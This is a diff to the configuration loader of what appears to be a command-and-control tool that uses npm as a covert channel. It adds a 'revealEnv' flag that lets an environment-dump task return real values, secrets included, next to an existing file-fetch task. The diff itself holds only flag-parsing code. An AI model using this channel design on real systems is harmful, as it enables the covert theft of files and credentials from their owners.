@@ -16,8 +16,16 @@ export const DEFAULTS = {
   logFile: '', // '' disables file logging
   stateFile: '', // role-specific default is used when empty
   maxFileBytes: 32 * 1024, // cap for the getfile task (channel moves ~130B/tag)
+  revealEnv: false, // opt-in: let the env task return real values (may expose secrets)
   token: '', // only ever populated from the NPM_C2_TOKEN env var
 };
+
+/** Accept true/1/"1"/"true"/"yes" (case-insensitive); everything else is false. */
+export function parseBoolFlag(value) {
+  if (value === true || value === 1) return true;
+  if (typeof value !== 'string') return false;
+  return ['1', 'true', 'yes'].includes(value.trim().toLowerCase());
+}
 
 export function channelTimings(pollIntervalSec) {
   const heartbeatMs = Math.max(30_000, Number(pollIntervalSec) * 1_000);
@@ -117,6 +125,9 @@ export function loadConfig(explicitPath) {
     const n = Number(process.env.NPM_C2_MAX_FILE_BYTES);
     if (Number.isFinite(n) && n > 0) cfg.maxFileBytes = Math.floor(n);
   }
+  if (process.env.NPM_C2_REVEAL_ENV !== undefined && process.env.NPM_C2_REVEAL_ENV !== '') {
+    cfg.revealEnv = parseBoolFlag(process.env.NPM_C2_REVEAL_ENV);
+  }
 
   // The auth token is ONLY ever read from the environment — never from a file.
   cfg.token = process.env.NPM_C2_TOKEN || '';
@@ -143,6 +154,7 @@ export function loadConfig(explicitPath) {
     throw new Error(`maxFileBytes must be a positive number, got ${cfg.maxFileBytes}`);
   }
   cfg.maxFileBytes = Math.floor(Number(cfg.maxFileBytes));
+  cfg.revealEnv = parseBoolFlag(cfg.revealEnv);
 
   return cfg;
 }
